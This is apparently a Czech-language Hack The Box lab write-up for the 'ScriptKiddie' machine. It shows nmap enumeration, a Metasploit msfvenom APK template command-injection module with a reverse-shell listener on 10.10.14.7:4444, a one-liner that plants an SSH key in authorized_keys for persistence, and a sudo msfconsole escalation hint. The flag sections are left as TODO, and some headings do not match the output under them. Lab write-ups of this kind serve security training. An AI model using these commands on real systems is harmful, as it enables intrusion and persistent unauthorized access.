---
layout: post
author: Tomáš Matějíček
title: "ScriptKiddie"
date: 2021-01-11
tags: linux command-injection ssh sudo exploit enumeration
---
[ScriptKiddie](https://www.hackthebox.eu/home/machines/profile/314) je stroj z Hack The Box. Cílem je přejít od prvotní enumerace až k plnému ovládnutí systému.

### Vyhledání otevřených portů
Nejdřív mapuji služby, které jsou dostupné zvenku.
`ports=$(nmap -p- -T4 $IP | grep ^[0-9] | cut -d "/" -f 1 | tr "\n" "," | sed s/,$//);echo $ports;nmap -p $ports -A -sC -sV -v $IP`
```
PORT   STATE SERVICE VERSION
```

### Přihlášení na cíl
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)`
```
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

5000
```

### Identifikace a hledání exploitu
Zjišťuji technologii a ověřuji známé zranitelnosti.
`searchsploit msfvenom`
```
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                         |  Path
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Metasploit Framework 6.0.11 - msfvenom APK template command injection                                                                  | multiple/local/49491.py
--------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

### Přihlášení na cíl (2)
Po získání přihlašovacích údajů přecházím na stabilní shell na cílovém stroji.
`msfconsole`
```
use exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection
set lhost 10.10.14.7
set lport 4444
exploit

netcat -lvp 4444
upload template

- přidat ssh identitu: mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && echo "ssh-rsa __CENSORED__== hack@t" >> ~/.ssh/authorized_keys
```

### Průzkum možností eskalace
Hledám chybné konfigurace a cesty k vyšším oprávněním.
`sudo -l`

### Spuštění exploitu
Zde dochází k praktickému zneužití zranitelnosti.
`sudo msfconsole`

### Získání user flagu
`TODO`

### Získání root flagu
`TODO`
